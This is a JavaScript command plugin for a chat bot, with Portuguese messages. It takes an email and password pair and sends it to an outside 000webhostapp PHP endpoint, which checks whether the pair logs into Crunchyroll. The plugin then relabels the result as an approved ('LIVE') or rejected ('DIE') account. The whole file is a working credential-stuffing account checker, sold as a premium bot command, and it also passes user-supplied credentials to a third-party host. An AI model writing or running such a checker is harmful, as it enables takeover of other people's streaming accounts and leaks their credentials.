import fetch from 'node-fetch'
import { addExif } from '../lib/sticker.js'
import { sticker } from '../lib/sticker.js'
let handler = async (m, { conn, args, text, command }) => {
if (text < 1) return m.reply('?')
let consul = text.replace(':','|').replace('/','|').replace(';','|')
if (!consul.includes('|')) throw 'Uso incorreto do comando!\nExemplo: /crunch email/senha'
if (!consul.includes('@')) throw 'Uso incorreto do comando!\nExemplo: /crunch email/senha'
let textoi = consul.replaceAll(' ','')
let texto = textoi.replaceAll(':','')
  let reis = await fetch("https://riskyzin1.000webhostapp.com/crunchyroll.php?lista=" + texto).then(v => v.text());
  let risos = reis.replaceAll(`<b><span class="badge badge-success">LIVE</span> ➜ `,'✅ | CONTA APROVADA\n'.toUpperCase())
  let risosS = risos.replaceAll(`<span class="badge badge-primary">Logado Com Sucesso</span> ➜ 1 Seg</b><br>`,'LOGADO COM SUCESSO!'.toUpperCase())
  let o44 = risosS.replaceAll(`<span class="badge badge-primary">Logado Com Sucesso</span> ➜ 0 Seg</b><br>`,'LOGADO COM SUCESSO!'.toUpperCase())
//NEGADO
let rIisos = o44.replaceAll(`<b>DIE ➜ `,'❌ | CONTA REPROVADA\n')
  let rIisosS = rIisos.replaceAll(`<span class="badge badge-primary">emai/senha incorretas</span> ➜ 1 Seg</b><br>`,'E-MAIL OU SENHA INCORRETO!')
  let oI44 = rIisosS.replaceAll(`<span class="badge badge-primary">emai/senha incorretas</span> ➜ 0 Seg</b><br>`,'E-MAIL OU SENHA INCORRETO!')

  m.reply(oI44)
}
handler.help = ['checker']
handler.tags = ['owner']
handler.command = /^(crunchyroll|crunch)$/i
handler.premium = true
handler.fail = null
export default handler